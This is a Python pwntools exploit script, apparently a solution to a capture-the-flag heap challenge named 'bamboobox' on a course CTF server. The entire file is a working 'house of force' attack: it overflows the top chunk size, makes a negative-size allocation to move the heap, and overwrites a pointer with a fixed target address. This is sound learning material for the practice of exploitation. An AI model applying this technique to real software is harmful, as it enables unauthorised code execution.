import pwn
import pwnlib

PIPE_CLEAN_TIME = 0.5 # s

MAGIC_ADDRESS = 0x400d49

pwn.context.terminal = ['tmux', 'splitw', '-h']
# pwn.context.log_level = 'debug'

def add_item(p, size, payload):
    print 'add_item', str(size), repr(payload)

    p.sendlineafter('Your choice:','2')
    p.sendlineafter('Please enter the length of item name:', str(size))
    p.sendafter('Please enter the name of item:', payload)
    return None

def change_item(p, index, size, payload):
    print 'change_item', str(index), str(size), repr(payload)

    p.sendlineafter('Your choice:', '3')
    p.sendlineafter('Please enter the index of item:', str(index))
    p.sendlineafter('Please enter the length of item name:', str(size))
    p.sendafter('Please enter the new name of the item:', payload)
    return None

# The house of force
if __name__ == '__main__':
    if pwnlib.args.args['REMOTE']:
        p = pwn.connect('csie.ctf.tw', 10138)
    else:
        p = pwn.process('./bamboobox-649a39b0d66eb71eec94b300a629e9f645bd75ad')

    size_of_first_block = 0x30

    p.settimeout(PIPE_CLEAN_TIME)

    add_item(p, size_of_first_block, 'x'*(size_of_first_block-1) )
    payload = 'y'*size_of_first_block
    payload += '\x00'*8   # prev_size
    payload += '\xFF'*8 # size, top chunk size to negative
    change_item(p, 0, len(payload)+1, payload)

    add_item(p, -size_of_first_block-0x10-0x20-0x10, '')
    add_item(p, 0x10, pwn.p64(MAGIC_ADDRESS)*2)

    # goodbye
    p.sendline('5')
    print p.recvall()
